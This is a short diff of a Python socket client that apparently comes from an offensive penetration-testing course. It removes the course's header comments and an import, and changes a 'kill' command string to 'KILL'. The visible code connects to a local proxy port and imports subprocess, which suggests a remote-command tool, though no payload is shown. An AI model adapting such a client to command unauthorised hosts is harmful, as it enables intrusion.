@@ -1,12 +1,5 @@
-# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
-# Follow me on LinkedIn https://jo.linkedin.com/in/python2
-
-
-# Basic TCP Client
-
 import socket
 import subprocess
-from six.moves import input as raw_input
 
 def connect(command, address="0.0.0.0", docker_proxy_port=18888):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
@@ -81,7 +74,7 @@ def _main ():
             print(response)
         except KeyboardInterrupt:
             try:
-                command = "kill".encode('utf-8')
+                command = "KILL".encode('utf-8')
                 _ = _connect(command)
                 sys.exit(0)
             except ConnectionRefusedError:
